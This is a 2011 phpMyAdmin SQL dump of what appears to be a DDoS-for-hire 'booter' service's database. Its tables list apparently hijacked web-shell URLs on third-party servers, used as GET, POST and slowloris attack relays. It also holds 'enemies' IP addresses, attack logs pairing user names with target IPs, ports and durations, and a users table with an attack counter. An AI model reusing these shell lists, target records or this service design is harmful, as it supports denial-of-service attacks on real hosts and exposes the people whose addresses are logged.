-- phpMyAdmin SQL Dump
-- version 3.3.9.2
-- http://www.phpmyadmin.net
--
-- Serveur: localhost
-- Généré le : Lun 11 Avril 2011 à 16:52
-- Version du serveur: 5.0.92
-- Version de PHP: 5.2.9

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Base de données: `jeejeepo_booter`
--

-- --------------------------------------------------------

--
-- Structure de la table `config`
--

CREATE TABLE IF NOT EXISTS `config` (
  `booter_name` varchar(100) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Contenu de la table `config`
--


-- --------------------------------------------------------

--
-- Structure de la table `enemies`
--

CREATE TABLE IF NOT EXISTS `enemies` (
  `id` int(50) NOT NULL auto_increment,
  `ip` varchar(15) collate latin1_general_ci NOT NULL,
  `notes` text collate latin1_general_ci NOT NULL,
  `enemy` varchar(20) collate latin1_general_ci NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci AUTO_INCREMENT=7 ;

--
-- Contenu de la table `enemies`
--

INSERT INTO `enemies` (`id`, `ip`, `notes`, `enemy`) VALUES
(1, '184.161.203.33', 'dd', 'jeejeepower'),
(2, '184.161.203.251', 'dd', 'jeejeepower');

-- --------------------------------------------------------

--
-- Structure de la table `friends`
--

CREATE TABLE IF NOT EXISTS `friends` (
  `id` int(50) NOT NULL auto_increment,
  `ip` varchar(15) collate latin1_general_ci NOT NULL,
  `notes` text collate latin1_general_ci NOT NULL,
  `friend` varchar(20) collate latin1_general_ci NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci AUTO_INCREMENT=7 ;

--
-- Contenu de la table `friends`
--

INSERT INTO `friends` (`id`, `ip`, `notes`, `friend`) VALUES
(3, '24.122.174.139', 'fffffffffffffffffffff', ''),
(4, '69.147.242.83', 'aaaaaaaaaaaa', ''),
(5, '216.6.224.104', 'aaaaaaaaaaaa', '');

-- --------------------------------------------------------

--
-- Structure de la table `getshells`
--

CREATE TABLE IF NOT EXISTS `getshells` (
  `URL` varchar(1000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Contenu de la table `getshells`
--

INSERT INTO `getshells` (`URL`) VALUES
('http://80.38.237.133/webdav/sheal.php'),
('http://118.144.223.199/webdav/sheal.php');

-- --------------------------------------------------------

--
-- Structure de la table `logs`
--

CREATE TABLE IF NOT EXISTS `logs` (
  `username` text NOT NULL,
  `ip` text NOT NULL,
  `time` text NOT NULL,
  `port` text NOT NULL,
  `date` varchar(100) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Contenu de la table `logs`
--

INSERT INTO `logs` (`username`, `ip`, `time`, `port`, `date`) VALUES
('Gabriel Bertrand', '98.209.1.70', '120', '80', '03-30-2011, 07:55:51 pm'),
('Hally', '90.198.165.198', '120', '3074', '04-11-2011, 02:49:34 pm');

-- --------------------------------------------------------

--
-- Structure de la table `news`
--

CREATE TABLE IF NOT EXISTS `news` (
  `id` int(11) NOT NULL auto_increment,
  `title` varchar(1000) NOT NULL,
  `message` text NOT NULL,
  `date` varchar(1000) NOT NULL,
  `author` varchar(1000) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=5 ;

--
-- Contenu de la table `news`
--

INSERT INTO `news` (`id`, `title`, `message`, `date`, `author`) VALUES
(1, 'New Staff.', 'Hello guys, i will be helping with the booter and such, if you NEED anything, hit me up on', '03-28-2011, 10:16:19 pm', 'Ryan'),
(2, 'dssdfdf', 'dsfsdfs', '04-10-2011, 06:29:28 pm', 'Paul Mac'),
(3, 'dssdfdf', 'dsfsdfs', '04-10-2011, 06:29:36 pm', 'Paul Mac'),
(4, 'dssdfdf', 'dsfsdfs', '04-10-2011, 06:29:45 pm', 'Paul Mac');

-- --------------------------------------------------------

--
-- Structure de la table `postshells`
--

CREATE TABLE IF NOT EXISTS `postshells` (
  `URL` varchar(9001) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Contenu de la table `postshells`
--

INSERT INTO `postshells` (`URL`) VALUES
('http://chuggly.com/?feed=rss2'),
('http://www.1100f.com/member/');

-- --------------------------------------------------------

--
-- Structure de la table `shellpool`
--

CREATE TABLE IF NOT EXISTS `shellpool` (
  `url` varchar(254) NOT NULL,
  `uts` int(15) NOT NULL default '0',
  `tbl` varchar(32) NOT NULL,
  `qry` longtext NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Contenu de la table `shellpool`
--

INSERT INTO `shellpool` (`url`, `uts`, `tbl`, `qry`) VALUES
('http://dec-css.de/', 1299201580, 'postshells', 'SU5TRVJUIElOVE8gYHBvc3RzaGVsbHNgIChgVVJMYCkgVkFMVUVTICgnaHR0cDovL2RlYy1jc3MuZGUvJyk7'),
('http://shahrood.net/forum/includes/help/', 1299808699, 'postshells', 'SU5TRVJUIElOVE8gYHBvc3RzaGVsbHNgIChgVVJMYCkgVkFMVUVTICgnaHR0cDovL3NoYWhyb29kLm5ldC9mb3J1bS9pbmNsdWRlcy9oZWxwLycpOw=='),
('http://89.248.166.28/shelly.php', 1301531396, 'postshells', 'SU5TRVJUIElOVE8gYHBvc3RzaGVsbHNgIChgVVJMYCkgVkFMVUVTICgnaHR0cDovLzg5LjI0OC4xNjYuMjgvc2hlbGx5LnBocCcpOw=='),
('http://www.nfs-samp.co.cc/', 1301531398, 'postshells', 'SU5TRVJUIElOVE8gYHBvc3RzaGVsbHNgIChgVVJMYCkgVkFMVUVTICgnaHR0cDovL3d3dy5uZnMtc2FtcC5jby5jYy8nKTs=');

-- --------------------------------------------------------

--
-- Structure de la table `slowloris`
--

CREATE TABLE IF NOT EXISTS `slowloris` (
  `URL` varchar(1000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Contenu de la table `slowloris`
--

INSERT INTO `slowloris` (`URL`) VALUES
('http://89.248.166.28/shelly.php'),
('http://200.66.107.245/webdav/shell.php');

-- --------------------------------------------------------

--
-- Structure de la table `updates`
--

CREATE TABLE IF NOT EXISTS `updates` (
  `id` int(10) NOT NULL auto_increment,
  `message` varchar(1000) NOT NULL,
  `date` varchar(1000) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=8 ;

--
-- Contenu de la table `updates`
--

INSERT INTO `updates` (`id`, `message`, `date`) VALUES
(1, 'Thanks for purshasing', '02-25-2011, 05:27:15 pm'),
(2, 'Hello yoshi', '04-08-2011, 06:48:22 pm');

-- --------------------------------------------------------

--
-- Structure de la table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id` bigint(20) NOT NULL auto_increment,
  `md5_id` varchar(200) collate latin1_general_ci NOT NULL default '',
  `full_name` tinytext collate latin1_general_ci NOT NULL,
  `user_name` varchar(200) collate latin1_general_ci NOT NULL default '',
  `user_email` varchar(220) collate latin1_general_ci NOT NULL default '',
  `user_level` tinyint(4) NOT NULL default '1',
  `pwd` varchar(220) collate latin1_general_ci NOT NULL default '',
  `address` text collate latin1_general_ci NOT NULL,
  `country` varchar(200) collate latin1_general_ci NOT NULL default '',
  `tel` varchar(200) collate latin1_general_ci NOT NULL default '',
  `fax` varchar(200) collate latin1_general_ci NOT NULL default '',
  `website` text collate latin1_general_ci NOT NULL,
  `date` varchar(1000) collate latin1_general_ci NOT NULL,
  `users_ip` varchar(200) collate latin1_general_ci NOT NULL default '',
  `approved` int(1) NOT NULL default '0',
  `activation_code` int(10) NOT NULL default '0',
  `banned` int(1) NOT NULL default '0',
  `ckey` varchar(220) collate latin1_general_ci NOT NULL default '',
  `ctime` varchar(220) collate latin1_general_ci NOT NULL default '',
  `myAttacks` varchar(5000) collate latin1_general_ci NOT NULL default '0',
  PRIMARY KEY  (`id`),
  UNIQUE KEY `user_email` (`user_email`),
  FULLTEXT KEY `idx_search` (`full_name`,`address`,`user_email`,`user_name`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci AUTO_INCREMENT=35 ;

--
-- Contenu de la table `users`
--

